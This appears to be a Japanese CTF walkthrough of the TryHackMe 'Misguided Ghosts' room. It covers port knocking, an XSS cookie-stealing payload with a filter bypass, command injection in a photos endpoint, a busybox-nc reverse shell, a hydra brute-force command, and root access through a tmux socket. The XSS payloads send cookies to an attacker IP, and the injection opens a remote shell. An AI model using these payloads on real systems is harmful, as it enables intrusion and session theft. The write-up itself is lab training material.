# Misguided Ghosts CTF

https://tryhackme.com/room/misguidedghosts

## Enumeration

```shell
TARGET=10.145.161.126
sudo bash -c "echo $TARGET   ghost.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
```

```sh
sudo nmap -sV -p21,22 $TARGET

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

FTP, SSH のみ。

## FTP

テキストファイル２つとキャプチャファイル。

```sh
ftp> ls -al
229 Entering Extended Passive Mode (|||61172|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||7599|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 ..
-rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
-rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng
```

ポートノッキング？どのポートかは不明。

```sh
$ cat info.txt    
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore

$ cat jokes.txt  
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```

### パケットキャプチャ

- ARP が6往復出ている。
- `www.jake-ruston.com`, `bobloblaw321.wixsite.com` をDNS解決している。（名前からルーム作成者のサイトか）
- 443ポート（HTTPS）の暗号化通信のセッションが1つ見える。内容不明。
- 応答が赤くなっているSYNパケットが5つあった。ポートノッキングを試す価値があると思われる。

```
5	0.076852146	192.168.236.128	192.168.236.131	TCP	58	7864	0	48930 → 7864 [SYN] Seq=0 Win=1024 Len=0 MSS=1460
11	1.316540457	192.168.236.128	192.168.236.131	TCP	58	8273	1	37528 → 8273 [SYN] Seq=0 Win=1024 Len=0 MSS=1460
17	2.528991493	192.168.236.128	192.168.236.131	TCP	58	9241	2	62066 → 9241 [SYN] Seq=0 Win=1024 Len=0 MSS=1460
56	4.879957944	192.168.236.128	192.168.236.131	TCP	58	12007	4	49227 → 12007 [SYN] Seq=0 Win=1024 Len=0 MSS=1460
871	7.415172458	192.168.236.128	192.168.236.131	TCP	58	60753	6	49061 → 60753 [SYN] Seq=0 Win=1024 Len=0 MSS=1460
```

ポートノッキングしたら、8080ポートが開いた。

```sh
root@ip-10-145-115-223:~# knock -d 1000 $TARGET 7864 8273 9241 12007 60753

root@ip-10-145-115-223:~# nmap -vv -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-20 06:20 BST
...
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 64
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 63
```

```sh
root@ip-10-145-115-223:~# nmap -sV -p8080 $TARGET

PORT     STATE SERVICE  VERSION
8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
```

HTTPSでブラウザでアクセスするとWebページが表示された。

証明書の情報。

```
emailAddress = zac@misguided_ghosts.thm
CN = misguided_ghosts.thm
O = Misguided Ghosts
L = Franklin
ST = Williamson Country
C = TN
```

念のためサブドメインを探したが無かった。

```sh
ffuf -u https://misguided_ghosts.thm:8080/ -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.misguided_ghosts.thm' -fs 429
```

dirb

```sh
---- Scanning URL: https://ghost.thm:8080/ ----
+ https://ghost.thm:8080/console (CODE:200|SIZE:1985)                                                               
+ https://ghost.thm:8080/dashboard (CODE:302|SIZE:219)                                                              
+ https://ghost.thm:8080/login (CODE:200|SIZE:761)
```

## /login

現状、攻撃サーフェスはログイン画面に絞られる。

1. マニュアルテストでもsqlmapでも、SQLインジェクションの脆弱性は発見できなかった。
2. NoSQLのインジェクションも効果見られず。
3. コマンドインジェクションも発見できなかった。
4. トップページの画像を調べたが何も出ず。
5. fasttrack によるブルートフォースを試みたが時間がかかりすぎて無理。

```sh
$ hydra $TARGET -s 8080 https-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -L ./users.txt  -P /usr/share/wordlists/fasttrack.txt
```

分からずウォークスルーを見た。-> zac / zac でログインできる。

login Cookieに、zac_from_paramore という値が設定されている。

## /dashboard

title / subtitle をポストする画面。

管理者が2分おきに読んでいると書かれているので、XSSと思われる。

```html
<IMG SRC=/ onerror="eval('fe'+'tch(`http://192.168.128.106:8000/${doc'+'ument.c'+'ookie}`)')"></img>
```

```html
<a href=javascript:eval(atob("ZmV0Y2goYGh0dHA6Ly8xOTIuMTY4LjEyOC4xMDY6ODAwMC8ke2RvY3VtZW50LmNvb2tpZX1gKTs="))>test</a>
```

```html
<script>document.write('<img src="http://192.168.128.106:8000/' + document.cookie + '">')</script>
```

```html
<script>fetch('http://192.168.128.106:8000/?cookie=' + btoa(document.cookie) );</script>
```

```html
<iframe src="javascript:eval(atob("ZmV0Y2goYGh0dHA6Ly8xOTIuMTY4LjEyOC4xMDY6ODAwMC8ke2RvY3VtZW50LmNvb2tpZX1gKTs="))">
```

上記いずれのパターンも失敗。

ログインCookieの値が、zac_from_paramore であることに注目。 paramore を検索したら、トップページの画像の人（バンド名）だった。同じ形でCoookie値を推測できないか？

```
admins_from_zac
admin_from_zac
admininistrator_from_zac
franklin_from_zac
franklin_from_paramore
paramore_from_zac
```

断念。下記のフィルター回避でCookieを盗めた。

```html
&lt;sscriptcript&gt;document.write('&lt;img src="http://192.168.128.106:8000/'+document.cookie+'"&gt;')&lt;/sscriptcript&gt;
```

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.145.161.126 - - [20/May/2026 03:54:05] code 404, message File not found
10.145.161.126 - - [20/May/2026 03:54:05] "GET /login=hayley_is_admin HTTP/1.1" 404 -
```

hayley としてログインできているが何かが表示されるわけでもない。

しかし、/photos でアップロード画面が表示されるようになっていた。

## /photos

普通にローカルのファイルをアップロードしようとしたら、よくわからないエラーが出る。

```
cannot access 'dog.jpg': No such file or directory
```

GETパラメータで `/etc/passwd` を指定してみる。  
`https://misguided_ghosts.thm:8080/photos?image=/etc/passwd`

`/etc/passwd` と表示された。ローカルのパスなのかサーバーのパスなのかよくわからないが、ローカルkaliユーザーのファイルである .bashrc を指定したら存在しないと表示されたので、サーバー側のパスを表しているらしい。

`cannot access '/home/kali/.bashrc': No such file or directory`

`cat /etc/passwd` をパラメータにしてみたところ、

```
https://misguided_ghosts.thm:8080/photos?image=`cat%20/etc/passwd`
```

なぜか ls コマンドの結果のようなものが返された。何故・・・？

```
Dockerfile
app.py
cert.pem
key.pem
requirements.txt
start.sh
static
stop.sh
templates
```

ls の結果。

```
https://misguided_ghosts.thm:8080/photos?image=`ls`
```

何故・・・？

```
Dockerfile
app.py
cert.pem
key.pem
requirements.txt
start.sh
stop.sh

static:
css
images
js

templates:
dashboard.html
index.html
login.html
photos.html
```

`a` の結果。

```
https://misguided_ghosts.thm:8080/photos?image=`a`
```

`cat` と同じパターン。

```
Dockerfile
app.py
cert.pem
key.pem
requirements.txt
start.sh
static
stop.sh
templates
```

落ち着いて、このエラーメッセージ `cannot access 'dog.jpg': No such file or directory` を考える。

これは ls コマンドのエラーメッセージの形。

```sh
$ ls a              
ls: cannot access 'a': No such file or directory
```

つまり、imageパラメータの値を、そのまま ls コマンドに渡して実行いる形と想定できる。なので、`https://misguided_ghosts.thm:8080/photos?image=app.py` をリクエストしたところ、`app.py` とだけ表示された。

狙うのはコマンドインジェクションだと思われる。

普通にセミコロンの形で成功した。

```
https://misguided_ghosts.thm:8080/photos?image=app.py;id
```

```
app.py
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

リバースシェル取得

```
app.py;busybox${IFS}nc${IFS}192.168.128.106${IFS}8888${IFS}-e${IFS}sh
```

```sh
$ nc -nlvp 8888              
listening on [any] 8888 ...
connect to [192.168.128.106] from (UNKNOWN) [10.145.161.126] 34149
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

SSH鍵とノートを入手。SSH鍵は暗号化されているとのこと。おそらくパスフレーズを設定しているということか？

```sh
pwd
/home/zac
ls -al
total 12
drwxr-xr-x    3 root     root          4096 May 20 05:16 .
drwxr-xr-x    1 root     root          4096 May 20 05:16 ..
drwxrwxr-x    2 1001     1001          4096 Aug 26  2020 notes
cd notes
ls -al
total 16
drwxrwxr-x    2 1001     1001          4096 Aug 26  2020 .
drwxr-xr-x    3 root     root          4096 May 20 05:16 ..
-rw-r--r--    1 1001     1002          1675 Aug 25  2020 .id_rsa
-rw-r--r--    1 1001     1002           270 Aug 25  2020 .secret
cat .id_rsa
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
[REDACTED]
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----
cat .secret
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.

- Paramore
```

## SSH

キーを使ってSSH接続すると、不正フォーマットと判定され使えない。

```sh
$ ssh zac@$TARGET -i ./.id_rsa
The authenticity of host '10.145.153.163 (10.145.153.163)' can't be established.
ED25519 key fingerprint is SHA256:tPogRfFyMYRZISVMCfez4OumDiEypjGHoQV9m7KRcII.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:317: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.145.153.163' (ED25519) to the list of known hosts.
Load key "./.id_rsa": invalid format
zac@10.145.153.163's password:
```

時間の無駄になりそうな予感がしたので、ここはすぐに公式ウォークスルーを見た。

- Vigenere 暗号されていることがメモから判断できるらしい（？？）
- RSA秘密鍵は必ずMIIから始まる（これはそう）
- 最初の16文字がヘッダーで固定（？）
- パスワードは rockyou に含まれる（？？？）

ということを前提とした解法が書かれていた。ここは色々腑に落ちなかった。

ともかくウォークスルーで表示されているヘッダーに1文字1文字合わせていってパスワードを得て id_rsa を復号した。

```sh
zac@misguided_ghosts:~$ id
uid=1001(zac) gid=1001(zac) groups=1001(zac)
```

```sh
zac@misguided_ghosts:~$ ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Aug 11  2020 .
drwxr-xr-x 23 root   root   4096 Aug 25  2020 ..
drwxr-x---  6 hayley hayley 4096 Aug 25  2020 hayley
drwxr-xr-x  6 zac    zac    4096 Aug 26  2020 zac
```

## 権限昇格１

hayleyのCronジョブがある。

```sh
zac@misguided_ghosts:~/notes$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
@reboot root /var/www/https/stop.sh
*/2  *  * * * hayley  /usr/bin/node /opt/xss/run.js
#
```

XSS の２分に１回ポストを読んでいるジョブだった。

```sh
zac@misguided_ghosts:~/notes$ ls -al /opt/xss/run.js
-rw-r--r-- 1 root root 340 Aug 18  2020 /opt/xss/run.js
zac@misguided_ghosts:~/notes$ cat /opt/xss/run.js
const puppeteer = require('puppeteer');

(async () => {
        const browser = await puppeteer.launch({ ignoreHTTPSErrors: true });
        const page = await browser.newPage();

        await page.setCookie({ name: 'login', value: 'hayley_is_admin', domain: 'localhost' });
        await page.goto('https://localhost:8080/dashboard');

        await browser.close();
})();
```

139, 445 ポートが開いている。SMB接続したい。

```sh
zac@misguided_ghosts:/var/www/https$ ss -nltp
State         Recv-Q         Send-Q                  Local Address:Port                  Peer Address:Port         
LISTEN        0              128                         127.0.0.1:43951                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:40017                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:36531                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:38355                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:43285                      0.0.0.0:*            
LISTEN        0              128                     127.0.0.53%lo:53                         0.0.0.0:*            
LISTEN        0              128                           0.0.0.0:22                         0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:35897                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:45469                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:37725                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:44861                      0.0.0.0:*            
LISTEN        0              50                          127.0.0.1:445                        0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:32895                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:36479                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:37121                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:40129                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:37251                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:34371                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:38339                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:33765                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:32935                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:46729                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:40779                      0.0.0.0:*            
LISTEN        0              50                          127.0.0.1:139                        0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:45323                      0.0.0.0:*            
LISTEN        0              10                          127.0.0.1:40077                      0.0.0.0:*            
LISTEN        0              128                                 *:8080                             *:*            
LISTEN        0              32                                  *:21                               *:*            
LISTEN        0              128                              [::]:22                            [::]:*            
LISTEN        0              50                              [::1]:445                           [::]:*            
LISTEN        0              50                              [::1]:139                           [::]:*
```

トンネリングしてSMB接続。

```sh
$ smbclient -L //localhost     
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        local           Disk      Local list of passwords for our services
        IPC$            IPC       IPC Service (misguided_ghosts server (Samba, Ubuntu))
```

passwords.bak を入手。

```sh
$ smbclient //localhost/local
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Wed Aug 26 10:31:28 2020
  ..                                  D        0  Mon Aug 24 20:00:53 2020
  passwords.bak                       N      160  Wed Aug 26 10:31:28 2020

                19475088 blocks of size 1024. 8536796 blocks available
smb: \> get passwords.bak
getting file \passwords.bak of size 160 as passwords.bak (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

この中の一番パスワードっぽいものを使ったら一発で成功した。

```sh
zac@misguided_ghosts:/home$ su hayley
Password: 
hayley@misguided_ghosts:/home$ 
```

ようやく！フラグ１を入手。

```sh
hayley@misguided_ghosts:~$ ls -al
total 44
drwxr-x--- 6 hayley hayley 4096 Aug 25  2020 .
drwxr-xr-x 4 root   root   4096 Aug 11  2020 ..
-rw------- 1 hayley hayley    0 Aug 28  2020 .bash_history
-rw-r--r-- 1 hayley hayley  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 hayley hayley 3771 Apr  4  2018 .bashrc
drwx------ 2 hayley hayley 4096 Aug 11  2020 .cache
drwx------ 3 hayley hayley 4096 Aug 11  2020 .gnupg
drwx------ 3 hayley hayley 4096 Aug 18  2020 .pki
-rw-r--r-- 1 hayley hayley  807 Apr  4  2018 .profile
-rw-r--r-- 1 hayley hayley    0 Aug 11  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 hayley hayley   16 Aug 19  2020 user.txt
drwxr-xr-x 2 hayley hayley 4096 Aug 18  2020 .vim
-rw------- 1 hayley hayley 1092 Aug 18  2020 .viminfo
```

## 権限昇格２

paramore グループに属している。

```sh
hayley@misguided_ghosts:~$ id
uid=1000(hayley) gid=1000(hayley) groups=1000(hayley),1002(paramore)
```

使えない。

```sh
hayley@misguided_ghosts:/home/zac$ find / -group paramore -type f -not -path "/proc/*" 2>/dev/null
/home/zac/notes/.id_rsa
/home/zac/notes/.secret
```

/usr/sbin/visudo を sudo で実行できる設定。

```sh
hayley@misguided_ghosts:~$ sudo -l
Matching Defaults entries for hayley on misguided_ghosts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hayley may run the following commands on misguided_ghosts:
    (ALL : ALL) NOPASSWD: /usr/sbin/visudo
```

sudoを自由にできたら昇格し放題だが、実行したら切断される。

```sh
hayley@misguided_ghosts:/home/zac$ sudo /usr/sbin/visudo
Connection to 10.146.152.227 closed by remote host.
Connection to 10.146.152.227 closed.
```

root の tmux プロセスが存在する。

```sh
hayley@misguided_ghosts:/home/zac$ ps aux | grep tmux
root       831  0.0  0.1  28540  3576 ?        Ss   05:41   0:00 /usr/bin/tmux -S /opt/.details new -s vpn -d
```

paramore グループに読み書き権限がついている。先程の検索で見つからなかったのは、これがファイルではないから。

```sh
hayley@misguided_ghosts:/home/zac$ ls -al /opt/.details
srw-rw---- 1 root paramore 0 May 21 05:41 /opt/.details
```

ソケットに接続。

```sh
hayley@misguided_ghosts:/home/zac$ /usr/bin/tmux -S /opt/.details
```

そのままルートシェルが表示された。

```sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -al /root
total 84
drwx------  9 root root  4096 Aug 28  2020 .
drwxr-xr-x 23 root root  4096 Aug 25  2020 ..
-rw-------  1 root root     0 Aug 28  2020 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Aug 16  2020 .cache
drwx------  3 root root  4096 Aug 18  2020 .config
drwx------  3 root root  4096 Aug 16  2020 .gnupg
drwxr-xr-x  3 root root  4096 Aug 25  2020 .local
-rw-------  1 root root    18 Aug 18  2020 .node_repl_history
drwxr-xr-x  4 root root  4096 Aug 18  2020 .npm
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-------  1 root root     7 Aug 18  2020 .python_history
-rw-r--r--  1 root root    18 Aug 19  2020 root.txt
-rw-r--r--  1 root root    75 Aug 20  2020 .selected_editor
drwx------  2 root root  4096 Aug 11  2020 .ssh
drwxr-xr-x  2 root root  4096 Aug 26  2020 .vim
-rw-------  1 root root 13833 Aug 28  2020 .viminfo
-rw-r--r--  1 root root   128 Aug 18  2020 .vimrc
-rw-r--r--  1 root root   208 Aug 18  2020 .wget-hsts
```

## 振り返り

- Insane寄りのHard。１つ目のフラグまでの道のりが長過ぎる。
- ポートノッキングを自力でクリアできたのは重畳。
- 相変わらずログイン画面が苦手。最も重要なスキルなのだが。後から思えば、メールアドレスのアカウント名には注目して然るべきだった。
- find によるグループ検索でソケットを見つけられなかったのは問題なので、テンプレートから -type f を削除した。
- ルームと同じヘッダーを持つRSAキーを生成するには PKCS#1 という古い形式を使う必要があり、下記のようなコマンドになる。

```sh
$ openssl genrsa -traditional -out traditional.key 2048

$ head ./traditional.key 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA0RB5bNHvkkIXmexXtFEjTwV/71VdidY+6JnxQ7hj8wiMZ0hX
GWYUjBb4clR8hXPbmzCQJUH7ELLq9b9F1m+bhhoQjNwOhld3cDqiR6V2N62xqgOp
```

## Tags

#tags:ポートノッキング #tags:XSS #tags:フィルターバイパス #tags:コマンドインジェクション #tags:tmux
